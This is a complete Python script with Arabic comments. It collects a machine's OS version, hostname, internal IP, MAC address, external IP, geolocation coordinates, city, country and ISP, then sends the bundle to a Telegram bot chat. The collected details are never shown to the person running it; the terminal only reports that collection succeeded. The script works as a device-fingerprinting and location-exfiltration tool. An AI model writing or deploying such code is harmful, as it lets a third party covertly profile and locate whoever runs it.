import platform
import socket
import requests
import uuid
import os
from typing import Optional, Dict, Any

def send_to_telegram(bot_token: str, chat_id: str, message: str):
    """يرسل النتائج إلى بوت Telegram."""
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(url, json=payload, timeout=10)
        response.raise_for_status()
        print("✓ تم إرسال النتائج إلى Telegram بنجاح")
    except Exception as e:
        print(f"✗ فشل الإرسال إلى Telegram: {e}")

def get_linux_distro() -> Optional[str]:
    """يحصل على اسم توزيعة Linux بدقة."""
    try:
        with open("/etc/os-release", encoding="utf-8") as file:
            for line in file:
                if "PRETTY_NAME" in line:
                    return line.split("=")[1].strip().strip('"')
    except FileNotFoundError:
        pass

    try:
        with open("/etc/lsb-release", encoding="utf-8") as file:
            for line in file:
                if "DISTRIB_DESCRIPTION" in line:
                    return line.split("=")[1].strip().strip('"')
    except FileNotFoundError:
        pass

    return None

def get_mac_address() -> str:
    """يحصل على عنوان MAC بشكل دقيق."""
    try:
        if platform.system() == "Linux":
            import fcntl
            import struct
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', bytes("enp0s3", 'utf-8')[:15]))
            return ':'.join(f'{b:02x}' for b in info[18:24])
        else:
            mac_num = uuid.getnode()
            return ':'.join(['{:02x}'.format((mac_num >> i) & 0xff) for i in range(0, 8*6, 8)])
    except Exception as e:
        return f"غير متاح (خطأ: {str(e)})"

def detect_os() -> Dict[str, Any]:
    """يكتشف معلومات نظام التشغيل بدقة."""
    system_name = platform.system()
    version = platform.version()
    release = platform.release()
    architecture = platform.architecture()[0]
    details = {
        "نظام التشغيل": system_name,
        "الإصدار": version,
        "الإصدار التفصيلي": release,
        "المعمارية": architecture,
        "معلومات إضافية": {}
    }

    if system_name == "Windows":
        win_ver = platform.win32_ver()
        details["نظام التشغيل"] = f"Windows {win_ver[0]}"
        details["معلومات إضافية"] = {
            "حزمة الخدمة": win_ver[1],
            "إصدار البناء": win_ver[2]
        }
    elif system_name == "Linux":
        distro = get_linux_distro()
        details["نظام التشغيل"] = distro if distro else "Linux (توزيعة غير معروفة)"
        details["معلومات إضافية"] = {
            "النواة": release
        }
    elif system_name == "Darwin":
        mac_ver = platform.mac_ver()
        details["نظام التشغيل"] = "iOS" if "iPhone" in os.uname().machine or "iPad" in os.uname().machine else "macOS"
        details["الإصدار التفصيلي"] = mac_ver[0]
    elif system_name == "Android":
        details["نظام التشغيل"] = "Android"
    else:
        details["نظام التشغيل"] = f"{system_name} (غير معروف)"

    return details

def get_network_info() -> Dict[str, Any]:
    """يجمع معلومات الشبكة والموقع."""
    info = {
        "الداخلية": {},
        "الخارجية": {}
    }

    try:
        hostname = socket.gethostname()
        info["الداخلية"]["اسم الجهاز"] = hostname
        info["الداخلية"]["IP الداخلي"] = socket.gethostbyname(hostname)
        info["الداخلية"]["MAC"] = get_mac_address()
    except Exception as e:
        info["الداخلية"]["خطأ"] = f"فشل الحصول على المعلومات الداخلية: {str(e)}"

    try:
        response = requests.get("https://ipinfo.io/json", timeout=10)
        data = response.json()
        info["الخارجية"]["IP الخارجي"] = data.get("ip", "غير متاح")
        info["الخارجية"]["موقع"] = data.get("loc", "غير متاح")
        info["الخارجية"]["مدينة"] = data.get("city", "غير متاح")
        info["الخارجية"]["منطقة"] = data.get("region", "غير متاح")
        info["الخارجية"]["دولة"] = data.get("country", "غير متاح")
        info["الخارجية"]["مزود الخدمة"] = data.get("org", "غير متاح")
    except requests.exceptions.RequestException as e:
        info["الخارجية"]["خطأ"] = f"فشل الحصول على المعلومات الخارجية: {str(e)}"

    return info

def format_results(os_info: Dict[str, Any], network_info: Dict[str, Any]) -> str:
    """يقوم بتنسيق النتائج كرسالة HTML لإرسالها إلى Telegram."""
    message = "<b>📊 معلومات النظام والشبكة</b>\n\n"
    
    message += "<b>💻 معلومات نظام التشغيل:</b>\n"
    message += f"• <b>النظام:</b> {os_info['نظام التشغيل']}\n"
    message += f"• <b>الإصدار:</b> {os_info['الإصدار']}\n"
    message += f"• <b>التفاصيل:</b> {os_info['الإصدار التفصيلي']}\n"
    message += f"• <b>المعمارية:</b> {os_info['المعمارية']}\n"
    
    for key, value in os_info['معلومات إضافية'].items():
        message += f"• <b>{key}:</b> {value}\n"

    message += "\n<b>🌐 معلومات الشبكة الداخلية:</b>\n"
    for key, value in network_info['الداخلية'].items():
        message += f"• <b>{key}:</b> {value}\n"

    message += "\n<b>🌍 معلومات الشبكة الخارجية:</b>\n"
    for key, value in network_info['الخارجية'].items():
        message += f"• <b>{key}:</b> {value}\n"

    return message

def main():
    """الدالة الرئيسية."""
    # إعدادات بوت Telegram (يجب تغييرها)
    BOT_TOKEN = "YOUR_BOT_TOKEN"
    CHAT_ID = "YOUR_CHAT_ID"
    
    os_info = detect_os()
    network_info = get_network_info()
    
    # عرض النتائج في الطرفية
    print("\n" + "="*40)
    print("جمع المعلومات بنجاح!")
    print("="*40 + "\n")
    
    # إرسال النتائج إلى Telegram
    message = format_results(os_info, network_info)
    send_to_telegram(BOT_TOKEN, CHAT_ID, message)

if __name__ == "__main__":
    main()
